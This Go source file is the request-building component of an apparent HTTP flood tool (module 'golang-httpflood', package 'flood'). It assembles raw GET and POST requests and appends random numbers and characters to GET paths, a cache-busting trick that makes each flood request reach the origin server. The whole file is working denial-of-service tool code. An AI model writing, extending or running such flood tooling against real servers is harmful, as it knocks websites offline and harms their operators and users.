package flood

import (
	"fmt"
	"strconv"

	"github.com/bonbonbon1414/golang-httpflood/internal/config"
	"github.com/bonbonbon1414/golang-httpflood/internal/utils"
)

// RequestBuilder constructs HTTP requests
type RequestBuilder struct {
	config *config.Config
}

// NewRequestBuilder creates a new request builder
func NewRequestBuilder(cfg *config.Config) *RequestBuilder {
	return &RequestBuilder{
		config: cfg,
	}
}

// BuildGETRequest builds a GET request string
func (rb *RequestBuilder) BuildGETRequest(headers string, paramSeparator string) string {
	request := "GET " + rb.config.Path + paramSeparator
	
	// Add random parameters for GET requests
	request += strconv.Itoa(utils.IntRange(1, 2147483647))
	request += utils.RandomString(rb.config.RandomChars, 1)
	request += utils.RandomString(rb.config.RandomChars, 1)
	request += utils.RandomString(rb.config.RandomChars, 1)
	request += utils.RandomString(rb.config.RandomChars, 1)
	
	request += " HTTP/1.1\r\n"
	request += "Host: " + rb.config.GetAddress() + "\r\n"
	request += headers
	request += "\r\n"
	
	return request
}

// BuildPOSTRequest builds a POST request string
func (rb *RequestBuilder) BuildPOSTRequest(headers string, data string) string {
	request := "POST " + rb.config.Path + " HTTP/1.1\r\n"
	request += "Host: " + rb.config.GetAddress() + "\r\n"
	request += headers
	request += "\r\n"
	request += data
	request += "\r\n"
	
	return request
}

// BuildRequest builds a request based on the configured mode
func (rb *RequestBuilder) BuildRequest(headers string, data string) (string, error) {
	switch rb.config.Mode {
	case "get":
		return rb.BuildGETRequest(headers, rb.config.GetURLParameterSeparator()), nil
	case "post":
		return rb.BuildPOSTRequest(headers, data), nil
	default:
		return "", fmt.Errorf("unsupported mode: %s", rb.config.Mode)
	}
}